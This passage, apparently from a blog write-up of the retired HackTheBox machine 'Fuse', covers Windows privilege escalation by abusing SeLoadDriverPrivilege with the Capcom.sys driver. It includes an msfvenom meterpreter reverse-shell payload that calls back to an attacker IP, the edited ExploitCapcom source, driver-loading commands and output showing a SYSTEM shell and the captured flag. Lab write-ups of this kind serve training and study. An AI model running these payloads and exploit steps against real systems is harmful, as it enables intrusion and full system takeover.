obvious</p><p>We need to specify our command in the files <code class="language-plaintext highlighter-rouge">ExploitCapcom.cpp</code> at the line <strong>292</strong> in function <code class="language-plaintext highlighter-rouge">Launchshell()</code></p><div class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">bool</span> <span class="nf">LaunchShell</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">TCHAR</span> <span class="n">CommandLine</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">cmd.exe"</span><span class="p">);</span>
+</pre></table></code></div></div><p>I changed the command to mine that will be a <code class="language-plaintext highlighter-rouge">shell.exe</code> so i can run my malicious binary created by <code class="language-plaintext highlighter-rouge">msfvenom</code></p><div class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">bool</span> <span class="nf">LaunchShell</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">TCHAR</span> <span class="n">CommandLine</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">test</span><span class="se">\\</span><span class="s">shell.exe"</span><span class="p">);</span>
+</pre></table></code></div></div><p>And one more file that is <code class="language-plaintext highlighter-rouge">capcom.sys</code></p><blockquote><p><a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" target="_blank">https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</a></p></blockquote><p>Now first we need to create a <code class="language-plaintext highlighter-rouge">shell.exe</code> using <strong>msfvenom</strong></p><h2 id="creating-the-malicious-file">Creating the malicious file</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>➜  files msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.4 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="o">&gt;</span> shell.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+</pre></table></code></div></div><p>And then upload all the four files to the machine</p><h2 id="uplaoding-files">Uplaoding files</h2><blockquote><p>Uploading files</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/fuse/4e142027-f031-4da7-a520-af7534092770/image-6.png" alt="Upload file" /></p><p>After uploading all the four files….</p><blockquote><p>Now Create the registry key under HKEY_CURRENT_USER (HKCU) and set driver configuration settings</p></blockquote><p>The driver will be the file <code class="language-plaintext highlighter-rouge">capcom.sys</code> and its absolute path</p><h2 id="exploitation">Exploitation</h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\test</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\eoploaddriver.exe</span><span class="w"> </span><span class="nx">System\CurrentControlSet\MyService</span><span class="w"> </span><span class="nx">C:\test\capcom.sys</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">Enabling</span><span class="w"> </span><span class="nx">SeLoadDriverPrivilege</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">SeLoadDriverPrivilege</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">Loading</span><span class="w"> </span><span class="nx">Driver:</span><span class="w"> </span><span class="nx">\Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService</span><span class="w">
+</span><span class="nf">NTSTATUS:</span><span class="w"> </span><span class="nx">00000000</span><span class="p">,</span><span class="w"> </span><span class="nx">WinError:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span></pre></table></code></div></div><p>Now start <code class="language-plaintext highlighter-rouge">listner</code> on metasploit</p><p>and run the file <code class="language-plaintext highlighter-rouge">.\ExploitCapcom.exe</code> for the final <code class="language-plaintext highlighter-rouge">exploitation</code></p><blockquote><p>Execute the <code class="language-plaintext highlighter-rouge">NTLoadDriver</code> function, specifying the registry key previously created</p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\test</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\ExploitCapcom.exe</span><span class="w">                                                                              
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Capcom.sys</span><span class="w"> </span><span class="nx">exploit</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Capcom.sys</span><span class="w"> </span><span class="nx">handle</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">obtained</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">0000000000000064</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Shellcode</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">placed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">000002B6CF0B0008</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">Shellcode</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">executed</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">Token</span><span class="w"> </span><span class="nx">stealing</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">successful</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">The</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">launched</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Press</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">exit</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">program</span><span class="w">
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\test</span><span class="err">&gt;</span><span class="w">
+</span></pre></table></code></div></div><p>And on our <code class="language-plaintext highlighter-rouge">listener</code> we got the shell as admin</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="nf">msf5</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nf">multi/handler</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nf">run</span><span class="w">
+
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Started</span><span class="w"> </span><span class="nx">reverse</span><span class="w"> </span><span class="nx">TCP</span><span class="w"> </span><span class="nx">handler</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">10.10.14.4:4444</span><span class="w"> 
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Sending</span><span class="w"> </span><span class="nx">stage</span><span class="w"> </span><span class="p">(</span><span class="mi">176195</span><span class="w"> </span><span class="nf">bytes</span><span class="p">)</span><span class="w"> </span><span class="nf">to</span><span class="w"> </span><span class="nx">10.10.10.193</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Meterpreter</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">opened</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.14.4</span><span class="p">:</span><span class="mi">4444</span><span class="w"> </span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="mf">10.10.10.193</span><span class="p">:</span><span class="mi">50134</span><span class="p">)</span><span class="w"> </span><span class="nf">at</span><span class="w"> </span><span class="nx">2020-06-17</span><span class="w"> </span><span class="nx">02:27:11</span><span class="w"> </span><span class="nt">-0400</span><span class="w">
+
+</span><span class="nf">meterpreter</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">shell</span><span class="w">
+</span><span class="kr">Process</span><span class="w"> </span><span class="mi">576</span><span class="w"> </span><span class="nf">created.</span><span class="w">
+</span><span class="nx">Channel</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">created.</span><span class="w">
+</span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="p">[</span><span class="kt">Version</span><span class="w"> </span><span class="mf">10.0.14393</span><span class="p">]</span><span class="w">
+</span><span class="p">(</span><span class="nf">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">
+
+</span><span class="nf">C:\test</span><span class="err">&gt;</span><span class="nx">whoami</span><span class="w">
+</span><span class="nf">whoami</span><span class="w">
+</span><span class="nx">nt</span><span class="w"> </span><span class="nx">authority\system</span><span class="w">
+</span></pre></table></code></div></div><h1 id="got-roottxt">Got root.txt</h1><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nf">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
+</span><span class="kr">type</span><span class="w"> </span><span class="nf">root.txt</span><span class="w">
+</span><span class="nx">39bb8e320aecfcdd345fc2e7be64ceb7</span><span class="w">
+
+</span><span class="nf">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w">
+</span></pre></table></code></div></div><p>And we pwned it …….</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> <a href="https://0xprashant.github.io/tabs/donation/" target="_blank">Donation for OSCP</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>Article on seloaddriverprivilege<td><a href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" target="_blank">https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/</a><tr><td>eoploaddriver.cpp<td><a href="https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp" target="_blank">https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp</a><tr><td>ExploitCapcom.cpp<td><a href="https://github.com/tandasat/ExploitCapcom" target="_blank">https://github.com/tandasat/ExploitCapcom</a><tr><td>capcom.sys<td><a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" target="_blank">https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/smbpasswd/" class="post-tag no-text-decoration" >smbpasswd</a> <a href="/tags/rpcclient/" class="post-tag no-text-decoration" >rpcclient</a> <a href="/tags/medusa/" class="post-tag no-text-decoration" >medusa</a> <a href="/tags/crackmapexec/" class="post-tag no-text-decoration" >crackmapexec</a> <a href="/tags/seloaddriverprivilege/" class="post-tag no-text-decoration" >SeLoadDriverPrivilege</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Fuse writeup - 0xPrashant&url=http://localhost:4000/posts/htb-fuse/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Fuse writeup - 0xPrashant&u=http://localhost:4000/posts/htb-fuse/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Fuse writeup - 0xPrashant&url=http://localhost:4000/posts/htb-fuse/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-blackfield/"><div class="card-body"> <span class="timeago small" > Jun 9 <i class="unloaded">2020-06-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blackfield writeup</h3><div class="text-muted small"><p> Introduction@Blackfield:~$ Column Details Name Blackfield IP 10.10.10.192 Points 40 Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder/"><div class="card-body"> <span class="timeago small" > May 30 <i class="unloaded">2020-05-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blunder writeup</h3><div class="text-muted small"><p> Introduction@Blunder:~$ Column Details Name Blunder IP 10.10.10.191 Points 20 Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-akerva/" class="btn btn-outline-primary"><p>Fortress Akerva writeup</p></a> <a href="/posts/htb-tabby/" class="btn btn-outline-primary"><p>Hackthebox Tabby writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-fuse/'; this.page.identifier = '/posts/htb-fuse/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
